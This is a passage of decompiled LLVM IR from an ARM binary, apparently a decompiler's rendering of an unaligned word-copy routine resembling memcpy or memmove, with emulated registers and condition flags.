dec_label_pc_154a4:                               ; preds = %.thread128
  %v0_154a4 = load i32, i32* @r1, align 4
  %v1_154a4 = urem i32 %v0_154a4, 4
  store i32 %v1_154a4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_154a4 = icmp eq i32 %v1_154a4, 0
  store i1 %v2_154a4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_154a4 to i2
  br i1 %v2_154a4, label %dec_label_pc_153d8, label %dec_label_pc_154ac

dec_label_pc_154ac:                               ; preds = %dec_label_pc_153d0, %dec_label_pc_154a4
  %v0_155cc76 = phi i32 [ %v1_153b0, %dec_label_pc_153d0 ], [ %v0_155cc77, %dec_label_pc_154a4 ]
  %v0_15534 = phi i32 [ %v2_153c0, %dec_label_pc_153d0 ], [ %v2_1549c, %dec_label_pc_154a4 ]
  %v0_154b4.off0 = phi i2 [ %extract.t, %dec_label_pc_153d0 ], [ %extract.t131, %dec_label_pc_154a4 ]
  %v0_154ac = phi i32 [ %v0_153b0, %dec_label_pc_153d0 ], [ %v0_154a4, %dec_label_pc_154a4 ]
  %v1_154ac = and i32 %v0_154ac, -4
  store i32 %v1_154ac, i32* %r1.global-to-local, align 4
  %v1_154b0 = inttoptr i32 %v1_154ac to i32*
  %v2_154b0 = load i32, i32* %v1_154b0, align 4
  store i32 %v2_154b0, i32* %lr.global-to-local, align 4
  %v4_154b0 = add i32 %v1_154ac, 4
  store i32 %v4_154b0, i32* %r1.global-to-local, align 4
  %v1_1552c = add i32 %v0_15534, -12
  %v3_1552c = sub i32 11, %v0_15534
  %v4_1552c = and i32 %v3_1552c, %v0_15534
  %v5_1552c = icmp slt i32 %v4_1552c, 0
  store i1 %v5_1552c, i1* %cpsr_v.global-to-local, align 1
  %v6_1552c = icmp slt i32 %v1_1552c, 0
  store i1 %v6_1552c, i1* %cpsr_n.global-to-local, align 1
  %v7_1552c = icmp eq i32 %v0_15534, 12
  store i1 %v7_1552c, i1* %cpsr_z.global-to-local, align 1
  %v2_15530 = xor i1 %v6_1552c, %v5_1552c
  switch i2 %v0_154b4.off0, label %dec_label_pc_154c0 [
    i2 -1, label %dec_label_pc_15598
    i2 -2, label %dec_label_pc_1552c
  ]

dec_label_pc_154c0:                               ; preds = %dec_label_pc_154ac
  br i1 %v2_15530, label %dec_label_pc_1550c, label %dec_label_pc_154c8

dec_label_pc_154c8:                               ; preds = %dec_label_pc_154c0
  store i32 %v1_1552c, i32* %r2.global-to-local, align 4
  %v3_154cc = load i32, i32* @r4, align 4
  store i32 %v3_154cc, i32* %stack_var_-16, align 4
  %v6_154cc = load i32, i32* @r5, align 4
  store i32 %v6_154cc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_154d0

dec_label_pc_154d0:                               ; preds = %dec_label_pc_154d0.dec_label_pc_154d0_crit_edge, %dec_label_pc_154c8
  %v0_154f4 = phi i32 [ %v12_154f4, %dec_label_pc_154d0.dec_label_pc_154d0_crit_edge ], [ %v0_155cc76, %dec_label_pc_154c8 ]
  %v0_154d4 = phi i32 [ %v0_154d4.pre, %dec_label_pc_154d0.dec_label_pc_154d0_crit_edge ], [ %v4_154b0, %dec_label_pc_154c8 ]
  %v0_154d0 = phi i32 [ %v0_154d0.pre, %dec_label_pc_154d0.dec_label_pc_154d0_crit_edge ], [ %v2_154b0, %dec_label_pc_154c8 ]
  %v3_154d0 = udiv i32 %v0_154d0, 256
  %v1_154d4 = inttoptr i32 %v0_154d4 to i32*
  %v2_154d4 = load i32, i32* %v1_154d4, align 4
  store i32 %v2_154d4, i32* %r4.global-to-local, align 4
  %v3_154d4 = add i32 %v0_154d4, 4
  %v4_154d4 = inttoptr i32 %v3_154d4 to i32*
  %v5_154d4 = load i32, i32* %v4_154d4, align 4
  store i32 %v5_154d4, i32* %r5.global-to-local, align 4
  %v6_154d4 = add i32 %v0_154d4, 8
  %v7_154d4 = inttoptr i32 %v6_154d4 to i32*
  %v8_154d4 = load i32, i32* %v7_154d4, align 4
  store i32 %v8_154d4, i32* %ip.global-to-local, align 4
  %v9_154d4 = add i32 %v0_154d4, 12
  %v10_154d4 = inttoptr i32 %v9_154d4 to i32*
  %v11_154d4 = load i32, i32* %v10_154d4, align 4
  store i32 %v11_154d4, i32* %lr.global-to-local, align 4
  %v12_154d4 = add i32 %v0_154d4, 16
  store i32 %v12_154d4, i32* %r1.global-to-local, align 4
  %v4_154d8 = mul i32 %v2_154d4, 16777216
  %v5_154d8 = or i32 %v4_154d8, %v3_154d0
  store i32 %v5_154d8, i32* @r3, align 4
  %v3_154dc = udiv i32 %v2_154d4, 256
  %v4_154e0 = mul i32 %v5_154d4, 16777216
  %v5_154e0 = or i32 %v4_154e0, %v3_154dc
  store i32 %v5_154e0, i32* %r4.global-to-local, align 4
  %v3_154e4 = udiv i32 %v5_154d4, 256
  %v4_154e8 = mul i32 %v8_154d4, 16777216
  %v5_154e8 = or i32 %v4_154e8, %v3_154e4
  store i32 %v5_154e8, i32* %r5.global-to-local, align 4
  %v3_154ec = udiv i32 %v8_154d4, 256
  %v4_154f0 = mul i32 %v11_154d4, 16777216
  %v5_154f0 = or i32 %v4_154f0, %v3_154ec
  store i32 %v5_154f0, i32* @ip, align 4
  %v1_154f4 = inttoptr i32 %v0_154f4 to i32*
  store i32 %v5_154d8, i32* %v1_154f4, align 4
  %v3_154f4 = add i32 %v0_154f4, 4
  %v4_154f4 = inttoptr i32 %v3_154f4 to i32*
  %v5_154f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_154f4, i32* %v4_154f4, align 4
  %v6_154f4 = add i32 %v0_154f4, 8
  %v7_154f4 = inttoptr i32 %v6_154f4 to i32*
  %v8_154f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_154f4, i32* %v7_154f4, align 4
  %v9_154f4 = add i32 %v0_154f4, 12
  %v10_154f4 = inttoptr i32 %v9_154f4 to i32*
  %v11_154f4 = load i32, i32* @ip, align 4
  store i32 %v11_154f4, i32* %v10_154f4, align 4
  %v12_154f4 = add i32 %v0_154f4, 16
  store i32 %v12_154f4, i32* @r0, align 4
  %v0_154f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_154f8 = add i32 %v0_154f8, -16
  store i32 %v1_154f8, i32* %r2.global-to-local, align 4
  %v3_154f8 = sub i32 15, %v0_154f8
  %v4_154f8 = and i32 %v3_154f8, %v0_154f8
  %v5_154f8 = icmp slt i32 %v4_154f8, 0
  %v6_154f8 = icmp slt i32 %v1_154f8, 0
  %v2_154fc = xor i1 %v6_154f8, %v5_154f8
  br i1 %v2_154fc, label %dec_label_pc_15500, label %dec_label_pc_154d0.dec_label_pc_154d0_crit_edge

dec_label_pc_154d0.dec_label_pc_154d0_crit_edge:  ; preds = %dec_label_pc_154d0
  %v0_154d0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_154d4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_154d0

dec_label_pc_15500:                               ; preds = %dec_label_pc_154d0
  %v2_15500 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15500, i32* @r4, align 4
  %v5_15500 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15500, i32* @r5, align 4
  %v1_15504 = add i32 %v0_154f8, -4
  store i32 %v1_15504, i32* %r2.global-to-local, align 4
  %v3_15504 = add i32 %v0_154f8, 2147483632
  %v4_15504 = and i32 %v1_15504, %v3_15504
  %v5_15504 = icmp slt i32 %v4_15504, 0
  store i1 %v5_15504, i1* %cpsr_v.global-to-local, align 1
  %v6_15504 = icmp slt i32 %v1_15504, 0
  store i1 %v6_15504, i1* %cpsr_n.global-to-local, align 1
  %v7_15504 = icmp eq i32 %v1_15504, 0
  store i1 %v7_15504, i1* %cpsr_z.global-to-local, align 1
  %v2_15508 = xor i1 %v6_15504, %v5_15504
  br i1 %v2_15508, label %dec_label_pc_15524, label %dec_label_pc_1550c

dec_label_pc_1550c:                               ; preds = %dec_label_pc_15500, %dec_label_pc_154c0, %dec_label_pc_1550c
  %v1_15518 = phi i32 [ %v4_15518, %dec_label_pc_1550c ], [ %v12_154f4, %dec_label_pc_15500 ], [ %v0_155cc76, %dec_label_pc_154c0 ]
  %v0_1550c = load i32, i32* %lr.global-to-local, align 4
  %v3_1550c = udiv i32 %v0_1550c, 256
  store i32 %v3_1550c, i32* %ip.global-to-local, align 4
  %v0_15510 = load i32, i32* %r1.global-to-local, align 4
  %v1_15510 = inttoptr i32 %v0_15510 to i32*
  %v2_15510 = load i32, i32* %v1_15510, align 4
  store i32 %v2_15510, i32* %lr.global-to-local, align 4
  %v4_15510 = add i32 %v0_15510, 4
  store i32 %v4_15510, i32* %r1.global-to-local, align 4
  %v4_15514 = mul i32 %v2_15510, 16777216
  %v5_15514 = or i32 %v4_15514, %v3_1550c
  store i32 %v5_15514, i32* @ip, align 4
  %v2_15518 = inttoptr i32 %v1_15518 to i32*
  store i32 %v5_15514, i32* %v2_15518, align 4
  %v3_15518 = load i32, i32* @r0, align 4
  %v4_15518 = add i32 %v3_15518, 4
  store i32 %v4_15518, i32* @r0, align 4
  %v0_1551c = load i32, i32* %r2.global-to-local, align 4
  %v1_1551c = add i32 %v0_1551c, -4
  store i32 %v1_1551c, i32* %r2.global-to-local, align 4
  %v3_1551c = sub i32 3, %v0_1551c
  %v4_1551c = and i32 %v3_1551c, %v0_1551c
  %v5_1551c = icmp slt i32 %v4_1551c, 0
  %v6_1551c = icmp slt i32 %v1_1551c, 0
  %v2_15520 = xor i1 %v6_1551c, %v5_1551c
  br i1 %v2_15520, label %dec_label_pc_15524.loopexit, label %dec_label_pc_1550c

dec_label_pc_15524.loopexit:                      ; preds = %dec_label_pc_1550c
  %v7_1551c = icmp eq i32 %v0_1551c, 4
  store i1 %v5_1551c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1551c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1551c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15524

dec_label_pc_15524:                               ; preds = %dec_label_pc_15524.loopexit, %dec_label_pc_15500
  %v0_1544c59 = phi i32 [ %v1_1551c, %dec_label_pc_15524.loopexit ], [ %v1_15504, %dec_label_pc_15500 ]
  %v0_15524 = load i32, i32* %r1.global-to-local, align 4
  %v1_15524 = add i32 %v0_15524, -3
  store i32 %v1_15524, i32* @r1, align 4
  br label %bb140

dec_label_pc_1552c:                               ; preds = %dec_label_pc_154ac
  br i1 %v2_15530, label %dec_label_pc_15578, label %dec_label_pc_15534

dec_label_pc_15534:                               ; preds = %dec_label_pc_1552c
  store i32 %v1_1552c, i32* %r2.global-to-local, align 4
  %v3_15538 = load i32, i32* @r4, align 4
  store i32 %v3_15538, i32* %stack_var_-16, align 4
  %v6_15538 = load i32, i32* @r5, align 4
  store i32 %v6_15538, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1553c

dec_label_pc_1553c:                               ; preds = %dec_label_pc_1553c.dec_label_pc_1553c_crit_edge, %dec_label_pc_15534
  %v0_15560 = phi i32 [ %v12_15560, %dec_label_pc_1553c.dec_label_pc_1553c_crit_edge ], [ %v0_155cc76, %dec_label_pc_15534 ]
  %v0_15540 = phi i32 [ %v0_15540.pre, %dec_label_pc_1553c.dec_label_pc_1553c_crit_edge ], [ %v4_154b0, %dec_label_pc_15534 ]
  %v0_1553c = phi i32 [ %v0_1553c.pre, %dec_label_pc_1553c.dec_label_pc_1553c_crit_edge ], [ %v2_154b0, %dec_label_pc_15534 ]
  %v3_1553c = udiv i32 %v0_1553c, 65536
  %v1_15540 = inttoptr i32 %v0_15540 to i32*
  %v2_15540 = load i32, i32* %v1_15540, align 4
  store i32 %v2_15540, i32* %r4.global-to-local, align 4
  %v3_15540 = add i32 %v0_15540, 4
  %v4_15540 = inttoptr i32 %v3_15540 to i32*
  %v5_15540 = load i32, i32* %v4_15540, align 4
  store i32 %v5_15540, i32* %r5.global-to-local, align 4
  %v6_15540 = add i32 %v0_15540, 8
  %v7_15540 = inttoptr i32 %v6_15540 to i32*
  %v8_15540 = load i32, i32* %v7_15540, align 4
  store i32 %v8_15540, i32* %ip.global-to-local, align 4
  %v9_15540 = add i32 %v0_15540, 12
  %v10_15540 = inttoptr i32 %v9_15540 to i32*
  %v11_15540 = load i32, i32* %v10_15540, align 4
  store i32 %v11_15540, i32* %lr.global-to-local, align 4
  %v12_15540 = add i32 %v0_15540, 16
  store i32 %v12_15540, i32* %r1.global-to-local, align 4
  %v4_15544 = mul i32 %v2_15540, 65536
  %v5_15544 = or i32 %v4_15544, %v3_1553c
  store i32 %v5_15544, i32* @r3, align 4
  %v3_15548 = udiv i32 %v2_15540, 65536
  %v4_1554c = mul i32 %v5_15540, 65536
  %v5_1554c = or i32 %v4_1554c, %v3_15548
  store i32 %v5_1554c, i32* %r4.global-to-local, align 4
  %v3_15550 = udiv i32 %v5_15540, 65536
  %v4_15554 = mul i32 %v8_15540, 65536
  %v5_15554 = or i32 %v4_15554, %v3_15550
  store i32 %v5_15554, i32* %r5.global-to-local, align 4
  %v3_15558 = udiv i32 %v8_15540, 65536
  %v4_1555c = mul i32 %v11_15540, 65536
  %v5_1555c = or i32 %v4_1555c, %v3_15558
  store i32 %v5_1555c, i32* @ip, align 4
  %v1_15560 = inttoptr i32 %v0_15560 to i32*
  store i32 %v5_15544, i32* %v1_15560, align 4
  %v3_15560 = add i32 %v0_15560, 4
  %v4_15560 = inttoptr i32 %v3_15560 to i32*
  %v5_15560 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15560, i32* %v4_15560, align 4
  %v6_15560 = add i32 %v0_15560, 8
  %v7_15560 = inttoptr i32 %v6_15560 to i32*
  %v8_15560 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15560, i32* %v7_15560, align 4
  %v9_15560 = add i32 %v0_15560, 12
  %v10_15560 = inttoptr i32 %v9_15560 to i32*
  %v11_15560 = load i32, i32* @ip, align 4
  store i32 %v11_15560, i32* %v10_15560, align 4
  %v12_15560 = add i32 %v0_15560, 16
  store i32 %v12_15560, i32* @r0, align 4
  %v0_15564 = load i32, i32* %r2.global-to-local, align 4
  %v1_15564 = add i32 %v0_15564, -16
  store i32 %v1_15564, i32* %r2.global-to-local, align 4
  %v3_15564 = sub i32 15, %v0_15564
  %v4_15564 = and i32 %v3_15564, %v0_15564
  %v5_15564 = icmp slt i32 %v4_15564, 0
  %v6_15564 = icmp slt i32 %v1_15564, 0
  %v2_15568 = xor i1 %v6_15564, %v5_15564
  br i1 %v2_15568, label %dec_label_pc_1556c, label %dec_label_pc_1553c.dec_label_pc_1553c_crit_edge

dec_label_pc_1553c.dec_label_pc_1553c_crit_edge:  ; preds = %dec_label_pc_1553c
  %v0_1553c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_15540.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1553c

dec_label_pc_1556c:                               ; preds = %dec_label_pc_1553c
  %v2_1556c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1556c, i32* @r4, align 4
  %v5_1556c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1556c, i32* @r5, align 4
  %v1_15570 = add i32 %v0_15564, -4
  store i32 %v1_15570, i32* %r2.global-to-local, align 4
  %v3_15570 = add i32 %v0_15564, 2147483632
  %v4_15570 = and i32 %v1_15570, %v3_15570
  %v5_15570 = icmp slt i32 %v4_15570, 0
  store i1 %v5_15570, i1* %cpsr_v.global-to-local, align 1
  %v6_15570 = icmp slt i32 %v1_15570, 0
  store i1 %v6_15570, i1* %cpsr_n.global-to-local, align 1
  %v7_15570 = icmp eq i32 %v1_15570, 0
  store i1 %v7_15570, i1* %cpsr_z.global-to-local, align 1
  %v2_15574 = xor i1 %v6_15570, %v5_15570
  br i1 %v2_15574, label %dec_label_pc_15590, label %dec_label_pc_15578

dec_label_pc_15578:                               ; preds = %dec_label_pc_1556c, %dec_label_pc_1552c, %dec_label_pc_15578
  %v1_15584 = phi i32 [ %v4_15584, %dec_label_pc_15578 ], [ %v12_15560, %dec_label_pc_1556c ], [ %v0_155cc76, %dec_label_pc_1552c ]
  %v0_15578 = load i32, i32* %lr.global-to-local, align 4
  %v3_15578 = udiv i32 %v0_15578, 65536
  store i32 %v3_15578, i32* %ip.global-to-local, align 4
  %v0_1557c = load i32, i32* %r1.global-to-local, align 4
  %v1_1557c = inttoptr i32 %v0_1557c to i32*
  %v2_1557c = load i32, i32* %v1_1557c, align 4
  store i32 %v2_1557c, i32* %lr.global-to-local, align 4
  %v4_1557c = add i32 %v0_1557c, 4
  store i32 %v4_1557c, i32* %r1.global-to-local, align 4
  %v4_15580 = mul i32 %v2_1557c, 65536
  %v5_15580 = or i32 %v4_15580, %v3_15578
  store i32 %v5_15580, i32* @ip, align 4
  %v2_15584 = inttoptr i32 %v1_15584 to i32*
  store i32 %v5_15580, i32* %v2_15584, align 4
  %v3_15584 = load i32, i32* @r0, align 4
  %v4_15584 = add i32 %v3_15584, 4
  store i32 %v4_15584, i32* @r0, align 4
  %v0_15588 = load i32, i32* %r2.global-to-local, align 4
  %v1_15588 = add i32 %v0_15588, -4
  store i32 %v1_15588, i32* %r2.global-to-local, align 4
  %v3_15588 = sub i32 3, %v0_15588
  %v4_15588 = and i32 %v3_15588, %v0_15588
  %v5_15588 = icmp slt i32 %v4_15588, 0
  %v6_15588 = icmp slt i32 %v1_15588, 0
  %v2_1558c = xor i1 %v6_15588, %v5_15588
  br i1 %v2_1558c, label %dec_label_pc_15590.loopexit, label %dec_label_pc_15578

dec_label_pc_15590.loopexit:                      ; preds = %dec_label_pc_15578
  %v7_15588 = icmp eq i32 %v0_15588, 4
  store i1 %v5_15588, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_15588, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_15588, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15590

dec_label_pc_15590:                               ; preds = %dec_label_pc_15590.loopexit, %dec_label_pc_1556c
  %v0_1544c60 = phi i32 [ %v1_15588, %dec_label_pc_15590.loopexit ], [ %v1_15570, %dec_label_pc_1556c ]
  %v0_15590 = load i32, i32* %r1.global-to-local, align 4
  %v1_15590 = add i32 %v0_15590, -2
  store i32 %v1_15590, i32* @r1, align 4
  br label %bb140

dec_label_pc_15598:                               ; preds = %dec_label_pc_154ac
  br i1 %v2_15530, label %dec_label_pc_155e4, label %dec_label_pc_155a0

dec_label_pc_155a0:                               ; preds = %dec_label_pc_15598
  store i32 %v1_1552c, i32* %r2.global-to-local, align 4
  %v3_155a4 = load i32, i32* @r4, align 4
  store i32 %v3_155a4, i32* %stack_var_-16, align 4
  %v6_155a4 = load i32, i32* @r5, align 4
  store i32 %v6_155a4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_155a8

dec_label_pc_155a8:                               ; preds = %dec_label_pc_155a8.dec_label_pc_155a8_crit_edge, %dec_label_pc_155a0
  %v0_155cc = phi i32 [ %v12_155cc, %dec_label_pc_155a8.dec_label_pc_155a8_crit_edge ], [ %v0_155cc76, %dec_label_pc_155a0 ]
  %v0_155ac = phi i32 [ %v0_155ac.pre, %dec_label_pc_155a8.dec_label_pc_155a8_crit_edge ], [ %v4_154b0, %dec_label_pc_155a0 ]
  %v0_155a8 = phi i32 [ %v0_155a8.pre, %dec_label_pc_155a8.dec_label_pc_155a8_crit_edge ], [ %v2_154b0, %dec_label_pc_155a0 ]
  %v3_155a8 = udiv i32 %v0_155a8, 16777216
  %v1_155ac = inttoptr i32 %v0_155ac to i32*
  %v2_155ac = load i32, i32* %v1_155ac, align 4
  store i32 %v2_155ac, i32* %r4.global-to-local, align 4
  %v3_155ac = add i32 %v0_155ac, 4
  %v4_155ac = inttoptr i32 %v3_155ac to i32*
  %v5_155ac = load i32, i32* %v4_155ac, align 4
  store i32 %v5_155ac, i32* %r5.global-to-local, align 4
  %v6_155ac = add i32 %v0_155ac, 8
  %v7_155ac = inttoptr i32 %v6_155ac to i32*
  %v8_155ac = load i32, i32* %v7_155ac, align 4
  store i32 %v8_155ac, i32* %ip.global-to-local, align 4
  %v9_155ac = add i32 %v0_155ac, 12
  %v10_155ac = inttoptr i32 %v9_155ac to i32*
  %v11_155ac = load i32, i32* %v10_155ac, align 4
  store i32 %v11_155ac, i32* %lr.global-to-local, align 4
  %v12_155ac = add i32 %v0_155ac, 16
  store i32 %v12_155ac, i32* %r1.global-to-local, align 4
  %v4_155b0 = mul i32 %v2_155ac, 256
  %v5_155b0 = or i32 %v4_155b0, %v3_155a8
  store i32 %v5_155b0, i32* @r3, align 4
  %v3_155b4 = udiv i32 %v2_155ac, 16777216
  %v4_155b8 = mul i32 %v5_155ac, 256
  %v5_155b8 = or i32 %v4_155b8, %v3_155b4
  store i32 %v5_155b8, i32* %r4.global-to-local, align 4
  %v3_155bc = udiv i32 %v5_155ac, 16777216
  %v4_155c0 = mul i32 %v8_155ac, 256
  %v5_155c0 = or i32 %v4_155c0, %v3_155bc
  store i32 %v5_155c0, i32* %r5.global-to-local, align 4
  %v3_155c4 = udiv i32 %v8_155ac, 16777216
  %v4_155c8 = mul i32 %v11_155ac, 256
  %v5_155c8 = or i32 %v4_155c8, %v3_155c4
  store i32 %v5_155c8, i32* @ip, align 4
  %v1_155cc = inttoptr i32 %v0_155cc to i32*
  store i32 %v5_155b0, i32* %v1_155cc, align 4
  %v3_155cc = add i32 %v0_155cc, 4
  %v4_155cc = inttoptr i32 %v3_155cc to i32*
  %v5_155cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_155cc, i32* %v4_155cc, align 4
  %v6_155cc = add i32 %v0_155cc, 8
  %v7_155cc = inttoptr i32 %v6_155cc to i32*
  %v8_155cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_155cc, i32* %v7_155cc, align 4
  %v9_155cc = add i32 %v0_155cc, 12
  %v10_155cc = inttoptr i32 %v9_155cc to i32*
  %v11_155cc = load i32, i32* @ip, align 4
  store i32 %v11_155cc, i32* %v10_155cc, align 4
  %v12_155cc = add i32 %v0_155cc, 16
  store i32 %v12_155cc, i32* @r0, align 4
  %v0_155d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_155d0 = add i32 %v0_155d0, -16
  store i32 %v1_155d0, i32* %r2.global-to-local, align 4
  %v3_155d0 = sub i32 15, %v0_155d0
  %v4_155d0 = and i32 %v3_155d0, %v0_155d0
  %v5_155d0 = icmp slt i32 %v4_155d0, 0
  %v6_155d0 = icmp slt i32 %v1_155d0, 0
  %v2_155d4 = xor i1 %v6_155d0, %v5_155d0
  br i1 %v2_155d4, label %dec_label_pc_155d8, label %dec_label_pc_155a8.dec_label_pc_155a8_crit_edge

dec_label_pc_155a8.dec_label_pc_155a8_crit_edge:  ; preds = %dec_label_pc_155a8
  %v0_155a8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_155ac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_155a8

dec_label_pc_155d8:                               ; preds = %dec_label_pc_155a8
  %v2_155d8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_155d8, i32* @r4, align 4
  %v5_155d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_155d8, i32* @r5, align 4
  %v1_155dc = add i32 %v0_155d0, -4
  store i32 %v1_155dc, i32* %r2.global-to-local, align 4
  %v3_155dc = add i32 %v0_155d0, 2147483632
  %v4_155dc = and i32 %v1_155dc, %v3_155dc
  %v5_155dc = icmp slt i32 %v4_155dc, 0
  store i1 %v5_155dc, i1* %cpsr_v.global-to-local, align 1
  %v6_155dc = icmp slt i32 %v1_155dc, 0
  store i1 %v6_155dc, i1* %cpsr_n.global-to-local, align 1
  %v7_155dc = icmp eq i32 %v1_155dc, 0
  store i1 %v7_155dc, i1* %cpsr_z.global-to-local, align 1
  %v2_155e0 = xor i1 %v6_155dc, %v5_155dc
  br i1 %v2_155e0, label %dec_label_pc_155fc, label %dec_label_pc_155e4

dec_label_pc_155e4:                               ; preds = %dec_label_pc_155d8, %dec_label_pc_15598, %dec_label_pc_155e4
  %v1_155f0 = phi i32 [ %v4_155f0, %dec_label_pc_155e4 ], [ %v12_155cc, %dec_label_pc_155d8 ], [ %v0_155cc76, %dec_label_pc_15598 ]
  %v0_155e4 = load i32, i32* %lr.global-to-local, align 4
  %v3_155e4 = udiv i32 %v0_155e4, 16777216
  store i32 %v3_155e4, i32* %ip.global-to-local, align 4
  %v0_155e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_155e8 = inttoptr i32 %v0_155e8 to i32*
  %v2_155e8 = load i32, i32* %v1_155e8, align 4
  store i32 %v2_155e8, i32* %lr.global-to-local, align 4
  %v4_155e8 = add i32 %v0_155e8, 4
  store i32 %v4_155e8, i32* %r1.global-to-local, align 4
  %v4_155ec = mul i32 %v2_155e8, 256
  %v5_155ec = or i32 %v4_155ec, %v3_155e4
  store i32 %v5_155ec, i32* @ip, align 4
  %v2_155f0 = inttoptr i32 %v1_155f0 to i32*
  store i32 %v5_155ec, i32* %v2_155f0, align 4
  %v3_155f0 = load i32, i32* @r0, align 4
  %v4_155f0 = add i32 %v3_155f0, 4
  store i32 %v4_155f0, i32* @r0, align 4
  %v0_155f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_155f4 = add i32 %v0_155f4, -4
  store i32 %v1_155f4, i32* %r2.global-to-local, align 4
  %v3_155f4 = sub i32 3, %v0_155f4
  %v4_155f4 = and i32 %v3_155f4, %v0_155f4
  %v5_155f4 = icmp slt i32 %v4_155f4, 0
  %v6_155f4 = icmp slt i32 %v1_155f4, 0
  %v2_155f8 = xor i1 %v6_155f4, %v5_155f4
  br i1 %v2_155f8, label %dec_label_pc_155fc.loopexit, label %dec_label_pc_155e4

dec_label_pc_155fc.loopexit:                      ; preds = %dec_label_pc_155e4
  %v7_155f4 = icmp eq i32 %v0_155f4, 4
  store i1 %v5_155f4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_155f4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_155f4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_155fc

dec_label_pc_155fc:                               ; preds = %dec_label_pc_155fc.loopexit, %dec_label_pc_155d8
  %v0_1544c61 = phi i32 [ %v1_155f4, %dec_label_pc_155fc.loopexit ], [ %v1_155dc, %dec_label_pc_155d8 ]
  %v0_155fc = load i32, i32* %r1.global-to-local, align 4
  %v1_155fc = add i32 %v0_155fc, -1
  store i32 %v1_155fc, i32* @r1, align 4
  br label %bb140

dec_label_pc_15604:                               ; preds = %dec_label_pc_153b0
  %v1_15604 = load i32, i32* @r2, align 4
  %v2_15604 = add i32 %v1_15604, %v0_153b0
  store i32 %v2_15604, i32* %r1.global-to-local, align 4
  %v2_15608 = add i32 %v1_15604, %v1_153b0
  store i32 %v2_15608, i32* %r0.global-to-local, align 4
  %v2_1560c = add i32 %v1_15604, -4
  store i32 %v2_1560c, i32* %r2.global-to-local, align 4
  %v4_1560c = sub i32 3, %v1_15604
  %v5_1560c = and i32 %v4_1560c, %v1_15604
  %v6_1560c = icmp slt i32 %v5_1560c, 0
  store i1 %v6_1560c, i1* %cpsr_v.global-to-local, align 1
  %v7_1560c = icmp slt i32 %v2_1560c, 0
  store i1 %v7_1560c, i1* %cpsr_n.global-to-local, align 1
  %v8_1560c = icmp eq i32 %v1_15604, 4
  store i1 %v8_1560c, i1* %cpsr_z.global-to-local, align 1
  %v5_15610 = icmp slt i32 %v1_15604, 4
  br i1 %v5_15610, label %bb150, label %dec_label_pc_15614

dec_label_pc_15614:                               ; preds = %dec_label_pc_15604
  %v1_15614 = urem i32 %v2_15608, 4
  store i32 %v1_15614, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15614 = icmp eq i32 %v1_15614, 0
  store i1 %v2_15614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15614, label %dec_label_pc_1561c, label %dec_label_pc_156bc

dec_label_pc_1561c:                               ; preds = %dec_label_pc_15614
  %v1_1561c = urem i32 %v2_15604, 4
  store i32 %v1_1561c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1561c = icmp eq i32 %v1_1561c, 0
  store i1 %v2_1561c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1561c, label %dec_label_pc_15624, label %dec_label_pc_156e8

dec_label_pc_15624:                               ; preds = %dec_label_pc_1561c, %dec_label_pc_156e0
  %v0_1563c37 = phi i32 [ %v2_15608, %dec_label_pc_1561c ], [ %v0_1573020, %dec_label_pc_156e0 ]
  %v0_1563836 = phi i32 [ %v2_15604, %dec_label_pc_1561c ], [ %v0_156e0, %dec_label_pc_156e0 ]
  %v0_15624 = phi i32 [ %v2_1560c, %dec_label_pc_1561c ], [ %v2_156d8, %dec_label_pc_156e0 ]
  %v2_15624 = add i32 %v0_15624, -8
  store i32 %v2_15624, i32* %r2.global-to-local, align 4
  %v4_15624 = sub i32 7, %v0_15624
  %v5_15624 = and i32 %v4_15624, %v0_15624
  %v6_15624 = icmp slt i32 %v5_15624, 0
  store i1 %v6_15624, i1* %cpsr_v.global-to-local, align 1
  %v7_15624 = icmp slt i32 %v2_15624, 0
  store i1 %v7_15624, i1* %cpsr_n.global-to-local, align 1
  %v8_15624 = icmp eq i32 %v0_15624, 8
  store i1 %v8_15624, i1* %cpsr_z.global-to-local, align 1
  %v5_15628 = icmp slt i32 %v0_15624, 8
  br i1 %v5_15628, label %dec_label_pc_15674, label %dec_label_pc_1562c

dec_label_pc_1562c:                               ; preds = %dec_label_pc_15624
  %v3_1562c = load i32, i32* @r4, align 4
  %v5_1562c = inttoptr i32 %v3_1562c to i8*
